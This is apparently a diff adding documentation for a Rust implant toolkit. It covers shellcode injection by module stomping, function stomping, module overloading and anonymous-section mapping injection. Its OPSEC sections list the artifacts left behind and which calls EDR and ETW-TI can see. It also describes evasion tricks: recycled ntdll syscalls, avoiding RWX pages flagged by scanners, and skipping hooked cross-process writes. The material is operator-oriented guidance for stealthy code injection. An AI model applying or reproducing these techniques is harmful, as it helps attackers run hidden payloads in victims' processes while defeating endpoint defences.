+9. **`module_stomp.rs::stomp_remote` writes via `NtWriteVirtualMemory`**: The remote variant does NOT use mapping injection — it uses a direct cross-process write syscall, which is heavily hooked by EDRs. **Symptom**: high-EDR environment will catch the remote stomp. **Workaround**: use `mapping_inject` for the remote delivery and manually locate the entry point in the remote mapping.
+
+## OPSEC Notes
+
+**Artifacts left (post-execution, no cleanup):**
+- `module_stomp.rs`: stomped entry point in `chakra.dll` is permanent (no restore). `WaitForSingleObject` blocks for the duration of execution. `LoadLibraryExA` call to `chakra.dll` is recorded in PEB loader list. Handle closed via `nt_close`.
+- `func_stomp.rs`: `StompGuard::Drop` restores original bytes — no permanent artifact if the guard is dropped (RAII). Best OPSEC of the set.
+- `stomp.rs`: zeroes MZ/NT/section headers — anti-dump artifact but invisible to PEB-walking scanners.
+- `overload.rs::run`: SEC_IMAGE backing persists; module does NOT appear in PEB loader list (loaded via NtMapViewOfSection, not LoadLibrary). `fixing_arguments` overwrites the host's CommandLine (visible to `GetCommandLineW` callers). `run_manual_map` calls `stomp_mapped_region` to zero headers post-execution.
+- `mapping_inject.rs`: pagefile-backed section, no disk artifact. Local view unmapped immediately. Remote RX view persists for the lifetime of the shellcode thread.
+
+**Telemetry surface:**
+- All `crate::recycled::*` syscalls originate from `ntdll.dll .text` (not implant memory) — ETW-TI sees legitimate-looking kernel transitions.
+- `module_stomp.rs`'s `LoadLibraryExA` and `WaitForSingleObject` are visible to kernel32 hooks (not EDR-bypassed).
+- `stomp.rs::stomp_mapped_region` `VirtualProtect` is visible to kernel32 hooks.
+- `overload.rs::fixing_arguments` CommandLine overwrite is visible to EDRs that snapshot CommandLine at process creation vs. inspection time.
+
+**Cleanup functions:**
+- `func_stomp.rs::restore_bytes` — auto-called on guard drop.
+- `mapping_inject.rs` L173 `nt_unmap_view_of_section(h_process, remote_base)` — cleanup on thread-creation failure.
+- `module_stomp.rs` `FreeLibrary(h_module)` on every error branch.
+- `overload.rs::prepare` IIFE closure — `nt_free_virtual_memory` on all paths.
+
+## Reusable Patterns
+
+### Pattern: RAII byte-restore guard
+- **Use when**: temporarily overwriting memory (function bodies, entry points) and needing guaranteed restoration on scope exit.
+- **Code ref**: `func_stomp.rs::StompGuard` and `impl Drop for StompGuard`
+- **How**: `StompGuard { address, original_bytes: Vec<u8>, len }` captures originals before stomp. `Drop::drop` calls `restore_bytes(address, &original_bytes)` which re-flips RW via syscall, copies, restores protection. Drop is panic-safe — restoration happens even if the caller unwinds. 
+
+### Pattern: IIFE for guaranteed cleanup
+- **Use when**: an unsafe operation needs to free a resource on every return path (success, error, panic) but Rust doesn't yet have `defer`.
+- **Code ref**: `overload.rs::prepare` L510-L559
+- **How**: Wrap the working code in `(|| -> Result<()> { ... })()`, capture the result, then call the cleanup (`nt_free_virtual_memory`) unconditionally before returning. This is the manual emulation of `Drop` for raw NT handles.
+
+### Pattern: Vec::leak for FFI pointer stability
+- **Use when**: an FFI call requires a pointer that outlives the Rust function frame but the FFI doesn't take ownership.
+- **Code ref**: `overload.rs::build_nt_path` L82-L99
+- **How**: `Vec<u16>::leak()` returns `&'static mut [u16]`, then take `.as_mut_ptr()` for the `UnicodeString.Buffer`. Trade memory growth (never freed) for pointer validity. Document the intentional leak in code comments — operator audits will flag this otherwise.
+
+### Pattern: PE32/PE32+ Magic dispatch
+- **Use when**: parsing PE headers where the layout differs between 32- and 64-bit images.
+- **Code ref**: `module_stomp.rs` L67-L82, `overload.rs` L161-L200, `stomp.rs` L43-L57
+- **How**: Read `OptionalHeader.Magic` at `nt_base + 24` (after 4-byte NT signature + 20-byte FileHeader). If `0x020B` → use `IMAGE_NT_HEADERS64`. If `0x010B` → use `IMAGE_NT_HEADERS32`. For DataDirectory, use `nt_base + 0x88` (PE32+) or `nt_base + 0x78` (PE32) — the offsets differ because OptionalHeader32 is 96 bytes vs OptionalHeader64 is 112 bytes. Always validate Magic against both values and reject unknown magics.
+
+### Pattern: Two-step protection flip (RW → write → RX)
+- **Use when**: writing to an executable page without ever having W+X simultaneously.
+- **Code ref**: `func_stomp.rs::stomp_export` L75-L113, `module_stomp.rs` L88-L132
+- **How**: Flip to `PAGE_READWRITE (0x04)`, write, flip to `PAGE_EXECUTE_READ (0x20)`. Never allocate `PAGE_EXECUTE_READWRITE (0x40)` for stomping — RWX pages are a strong detection signal for EDRs (Moneta, pe-sieve flag them). On the RX flip failure, restore original bytes and original protection (defensive rollback).
+
+### Pattern: Anonymous section + dual-map injection
+- **Use when**: cross-process shellcode delivery without `NtWriteVirtualMemory` (which is heavily hooked).
+- **Code ref**: `mapping_inject.rs::do_mapping_and_execute` L107-L154
+- **How**: Create pagefile-backed section (`SEC_COMMIT=0x0800_0000`, no file handle), map RW locally, memcpy payload, map RX remotely, unmap local, `NtCreateThreadEx` at remote base. Both views share the same physical pages — the local memcpy is the only write, and it's not a cross-process operation.
+
+### Pattern: Inline NT struct definitions
+- **Use when**: needing NT structures (UNICODE_STRING, OBJECT_ATTRIBUTES, IO_STATUS_BLOCK, CLIENT_ID) without pulling in the heavyweight `ntapi` crate.
+- **Code ref**: `mapping_inject.rs` L213-L243, `overload.rs` L60-L78
+- **How**: Define `#[repr(C)] struct { ... }` with exact field types (`u16`, `u32`, `usize`, `*mut c_void`) matching the Windows kernel ABI. Use `null_mut()` for null ptrs, `std::mem::size_of::<Self>()` for the `Length` field. Cast via `as *mut _ as *mut c_void` for FFI.
